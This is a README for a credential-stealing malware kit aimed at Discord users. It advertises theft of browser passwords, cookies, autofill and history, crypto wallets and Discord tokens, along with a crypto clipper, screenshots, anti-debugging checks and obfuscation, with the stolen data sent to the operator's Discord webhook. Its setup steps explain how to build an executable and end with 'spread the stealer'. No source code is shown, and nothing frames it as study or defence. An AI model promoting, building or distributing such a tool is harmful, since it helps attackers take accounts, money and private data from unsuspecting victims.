## Information:
- [New Discord](https://discord.gg/eYQYJhWcPa)

## Features
- Fully undetected (0/65 detects)
- Very detailed user info (PC hostname, CPU, RAM, ...)
- Sends a screenshot to your webhook when executing the stealer
- Grabs executable info (path where the .exe was executed, ...)
- Searches for wallets in system and grabs them
- Grabs passwords, cookies, bookmarks & Extension cookies from all major browsers (Chrome, Opera, Brave, Yandex, Microsoft Edge)
- Silently saves all data separate in a zip file in a hidden folder and sends it to your webhook
- Modifies discord's desktop core (like known grabbers such as bbystealer & PirateStealer aka. Brooklyn/Arizona)
- Checks for debugging processes to avoid your webhook skid being reversed from skids (loop)
- Ultra high quality obfuscation
- Easy to setup (just modify the "config.js" file)
- Sends everything to your webhook in beautiful embeds
- Analyzes the data which was stolen and sends a zip file to your discord webhook
- Browser autofill grabber
- Browser history grabber
- Crypto clipper
- Searches for keywords in cookies, passwords, autofill and lists them on the top of the cookie/password/autofill log files
- Validates found discord tokens & if they work they only get sent to your webhook

## Setup:
- Download the files
- Install [NodeJS](https://nodejs.org/en/download/)
- Install the required packages by running `install.bat`
- Edit the `config.js` file and put your webhooks in it
- Run the `build.bat` file and an .exe file named `index-win.exe` will be created
- Spread the stealer and enjoy my fully undetected stealer :flushed:

- More grabbers (VPN's, Gaming, Messengers)
- Keylogger
- Growtopia stealer
- Discord bot to build within discord ($build <webhook_url>)
